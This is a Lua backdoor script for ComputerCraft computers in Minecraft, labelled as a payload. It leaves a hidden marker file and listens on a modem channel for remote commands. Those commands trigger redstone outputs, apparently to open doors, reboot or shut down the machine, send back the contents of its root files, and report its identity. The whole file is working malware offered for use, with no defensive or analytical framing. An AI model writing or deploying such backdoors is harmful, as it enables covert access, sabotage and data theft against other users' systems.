-- backdoor.lua — Payload
-- Persistent hidden access point.
-- Creates /.jnet_backdoor that listens for remote commands.

local BACKDOOR_PATH = "/.jnet_backdoor"
local BACKDOOR_CHANNEL = 6666

-- Mark presence
local f = fs.open(BACKDOOR_PATH, "w")
f.write("installed:" .. os.epoch("utc"))
f.close()

local function listen()
    local modem = peripheral.find("modem")
    if not modem then return end
    if not modem.isOpen(BACKDOOR_CHANNEL) then modem.open(BACKDOOR_CHANNEL) end

    while true do
        local ev, side, ch, rch, msg = os.pullEventRaw("modem_message")
        if ch == BACKDOOR_CHANNEL and type(msg) == "table" then
            if msg.type == "backdoor_cmd" and msg.target == os.getComputerID() then
                if msg.command == "open_door" then
                    -- Open all redstone sides
                    for _, side in ipairs({"top","bottom","left","right","front","back"}) do
                        redstone.setOutput(side, true)
                    end
                    sleep(3)
                    for _, side in ipairs({"top","bottom","left","right","front","back"}) do
                        redstone.setOutput(side, false)
                    end
                elseif msg.command == "reboot" then
                    os.reboot()
                elseif msg.command == "shutdown" then
                    os.shutdown()
                elseif msg.command == "exfil" then
                    local data = {}
                    for _, file in ipairs(fs.list("/")) do
                        if not fs.isDir("/" .. file) then
                            local fh = fs.open("/" .. file, "r")
                            if fh then data[file] = fh.readAll():sub(1, 500); fh.close() end
                        end
                    end
                    modem.transmit(BACKDOOR_CHANNEL, BACKDOOR_CHANNEL, {
                        type = "backdoor_data", from = os.getComputerID(), files = data,
                    })
                elseif msg.command == "ping" then
                    modem.transmit(BACKDOOR_CHANNEL, BACKDOOR_CHANNEL, {
                        type = "backdoor_pong", from = os.getComputerID(), label = os.getComputerLabel() or "",
                    })
                end
            end
        end
    end
end

listen()
